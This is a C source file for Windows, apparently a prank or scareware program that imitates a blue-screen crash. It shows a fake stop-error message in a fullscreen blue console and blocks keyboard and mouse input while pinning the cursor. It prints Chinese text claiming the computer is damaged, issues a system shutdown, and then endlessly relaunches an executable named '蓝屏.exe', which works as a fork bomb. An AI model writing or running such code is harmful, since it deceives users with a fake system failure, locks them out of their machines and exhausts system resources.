#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<time.h>
#include <winable.h>
char a[]= {"A problem has been detected and windows has been shut down to prevent damage to your computer.\n\
    Attempt to reset the display driver and recover from timeout failed.\n\
    If this is the first time you've seen this stop error screen,restart your computer.If this screen appears again,follow these steps:\n\
    Check to make sure any new hardware of software is properly installed.if this is a new installation,ask your hardware or software manufa cturer for any windows \nupdates you might need.\n\
    If problems continue,disable or remove any newly installed hardware or software.Disable BIOS memory options such as caching or shadowing.If you need to use safe \nmode to remove or disable components,restart your computer,press F8 to select Advanced startup options,and then select safe mode.\n\
    \n\
    Technical information:***stop:0x00000116(0x882D3008,0x956C7EB0,0x00000000,0x00000002)*** nvlddmkn.sys-Address 956C7EB0 base at 9560E000,Datestamp4a89ldle\n"
          };
void sleep(int ti) {
	int ti1=clock();
	while(clock()-ti1<ti)SetCursorPos(1599,899),BlockInput(true);
}
int main() {
	HWND hwnd=GetForegroundWindow();
	int x=GetSystemMetrics(SM_CXSCREEN)+300,y=GetSystemMetrics(SM_CYSCREEN)+300;
	char setting[30];
	sprintf(setting,"mode con:cols=%d lines=%d",x,y);
	system(setting);
	SetWindowPos(hwnd,HWND_TOPMOST,0,0,x+1000,y+1000,0);
	MoveWindow(hwnd,-8,-35,x+300,y+300,1);
	system("color 1F");
	int i,j=sizeof(a);
	for(i=0; i<j; ++i) {
		sleep(1);
		putchar(a[i]);
		BlockInput(true);
	}
	for(i=0; i<10; ++i) {
		sleep(1);
		printf("你的计算机已损坏\n");
		BlockInput(true);
	}
	system("shutdown -s");
	//MessageBox(GetForegroundWindow(),"你的计算机已损坏,将在一分钟内重启","错误",(UINT)0);
	FreeConsole();
	while(1)system("start 蓝屏.exe"),BlockInput(true);
	return 0;
}
